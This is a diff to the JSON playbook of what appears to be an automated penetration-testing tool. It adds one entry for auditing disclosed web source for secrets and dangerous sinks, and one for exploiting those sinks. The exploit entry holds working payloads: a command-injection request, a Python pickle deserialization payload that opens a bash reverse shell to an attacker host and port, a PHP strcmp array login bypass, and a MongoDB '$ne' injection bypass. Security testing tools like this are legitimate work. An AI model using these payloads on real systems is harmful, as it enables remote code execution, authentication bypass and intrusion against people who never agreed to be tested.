@@ -1238,7 +1238,8 @@
       "requires_any": [
         "web.parameterized",
         "http.reachable",
-        "web.param_candidate"
+        "web.param_candidate",
+        "web.vuln_sink"
       ],
       "produces": [
         "web.cmdi_confirmed",
@@ -3289,6 +3290,144 @@
       ],
       "deprioritize_when": [
         "foothold.linux"
+      ]
+    },
+    {
+      "id": "web-source-sink-audit",
+      "title": "Audit Disclosed Web Source & Package Manifests for Sinks and Secrets",
+      "hypothesis": "Once an LFI, exposed .git/backup, phpinfo() table, or HTTP 500 stack trace discloses server-side code or dependency manifests (package.json, composer.json, requirements.txt, pom.xml), stop blind fuzzing and audit the recovered code directly. Pull the adjacent configuration files for database/JWT secrets, check pinned package versions against public advisories, and grep routes for dangerous sinks (shell_exec, child_process.exec, subprocess shell=True, pickle/yaml/PHP deserialization, loose PHP == / strcmp auth checks, and raw NoSQL req.body queries).",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "grep"
+      ],
+      "locus": "R",
+      "diagnostic": true,
+      "phase": "enum",
+      "requires_all": [],
+      "requires_any": [
+        "web.source_disclosed",
+        "web.manifest_disclosed"
+      ],
+      "produces": [
+        "web.vuln_sink",
+        "vuln.web_sink",
+        "credential.candidate",
+        "exploit.versioned_banner"
+      ],
+      "settled_by": [
+        "web.vuln_sink"
+      ],
+      "obsoleted_by": [
+        "web.vuln_sink",
+        "foothold.linux",
+        "foothold.windows",
+        "access.shell"
+      ],
+      "deprioritize_when": [
+        "foothold.linux",
+        "foothold.windows",
+        "access.admin",
+        "access.system"
+      ],
+      "priority": 76,
+      "proves": "concrete server-side vulnerability sinks, hardcoded database/JWT credentials, or vulnerable third-party package versions inside disclosed application source",
+      "does_not_prove": "remote code execution or authentication bypass until a crafted request reaches the identified sink",
+      "report": {
+        "finding": "Server-Side Source Code or Dependency Manifest Disclosure",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://owasp.org/www-project-web-security-testing-guide/"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -sk \"{{url}}{{source_path|/index.php}}\"",
+          "note": "Fetch the disclosed source file, stack-trace module, or dependency manifest (`package.json`, `composer.json`, `requirements.txt`, `pom.xml`) and paste the response so obol extracts credentials, package versions, and dangerous sinks."
+        },
+        {
+          "tool": "grep",
+          "run": "grep -rnE 'mysqli_connect|new PDO|SqlConnection|mongodb(\\+srv)?://|postgres(ql)?://|jwt\\.sign|SECRET_KEY|DB_PASS' .",
+          "note": "Audit locally saved source files (from `.git`, backup archive, or LFI harvest under `{{app_base_path|/var/www/html}}`) for database connectors, connection URIs, and JWT signing keys."
+        },
+        {
+          "tool": "grep",
+          "run": "grep -rnE 'shell_exec|passthru|system\\(|child_process|subprocess\\.|os\\.system|pickle\\.loads|yaml\\.load|unserialize\\(|node-serialize|strcmp\\(|findOne\\(req\\.' .",
+          "note": "Scan recovered server-side source for command-execution sinks, unsafe deserialization, PHP loose/strcmp authentication checks, and unvalidated NoSQL query objects."
+        }
+      ]
+    },
+    {
+      "id": "web-vuln-sink-exploit",
+      "title": "Exploit Disclosed Server-Side Code Sink (CmdI / Deserialization / Type Juggling / NoSQLi)",
+      "hypothesis": "With the exact server-side sink visible in disclosed source code, craft a precision request matching the code path instead of guessing blind payloads: inject shell metacharacters into an unsanitized subprocess/exec parameter, send a serialized gadget to pickle/yaml/unserialize/node-serialize, pass an array `password[]=` or magic `0e` hash against PHP `strcmp()` / loose `==`, or submit a JSON `{\"$ne\": null}` object into a raw MongoDB `.findOne(req.body)` check.",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "python3"
+      ],
+      "locus": "R",
+      "phase": "access",
+      "requires_all": [
+        "web.vuln_sink",
+        "vuln.web_sink"
+      ],
+      "requires_any": [],
+      "produces": [
+        "access.shell",
+        "foothold.linux",
+        "foothold.windows",
+        "web.authz_bypass"
+      ],
+      "settled_by": [
+        "access.shell",
+        "foothold.linux",
+        "foothold.windows",
+        "web.authz_bypass"
+      ],
+      "obsoleted_by": [
+        "foothold.linux",
+        "foothold.windows",
+        "access.shell"
+      ],
+      "deprioritize_when": [
+        "foothold.linux",
+        "foothold.windows",
+        "access.admin",
+        "access.system"
+      ],
+      "priority": 82,
+      "proves": "remote command execution or authentication bypass by driving attacker input into the source-verified sink",
+      "does_not_prove": "host root or SYSTEM privileges beyond the web application service account",
+      "report": {
+        "finding": "White-Box Exploitation of Server-Side Code Sink",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://book.hacktricks.wiki/en/pentesting-web/index.html"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -sk -X POST \"{{url}}{{source_path|/api/run}}\" --data-urlencode \"cmd=127.0.0.1; id\"",
+          "note": "Command-execution sink (`shell_exec`, `system`, `child_process.exec`, `os.system`, `subprocess(..., shell=True)`): match the exact parameter name read by the route, confirm `uid=` output, then swap in a reverse shell to `{{lhost}}:{{lport}}`."
+        },
+        {
+          "tool": "python3",
+          "run": "python3 -c \"import pickle,base64,os; class P: __reduce__=lambda s:(os.system,('bash -c \\\"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\\\"',)); print(base64.b64encode(pickle.dumps(P())).decode())\"",
+          "note": "Unsafe deserialization sink (`pickle.loads`, `yaml.load`, PHP `unserialize`, `node-serialize`): generate a payload matching the sink's serializer encoding and deliver it in the cookie or body field the route decodes."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -sk -i -X POST \"{{url}}{{source_path|/login.php}}\" -d \"username=admin&password[]=\"",
+          "note": "PHP `strcmp()` / loose `==` sink: passing `password[]=` turns `$_POST['password']` into an Array so `strcmp(Array, $secret)` returns `NULL`, and `NULL == 0` evaluates truthy in PHP 5/7 (or use a magic `0e...` hash string against loose `md5() ==`)."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -sk -i -X POST \"{{url}}{{source_path|/login}}\" -H \"Content-Type: application/json\" -d '{\"username\":\"admin\",\"password\":{\"$ne\":null}}'",
+          "note": "Raw NoSQL `findOne(req.body)` sink: switching `Content-Type` to `application/json` lets Express `bodyParser.json()` pass an operator object `{\"$ne\": null}` straight into the MongoDB query."
+        }
       ]
     }
   ]
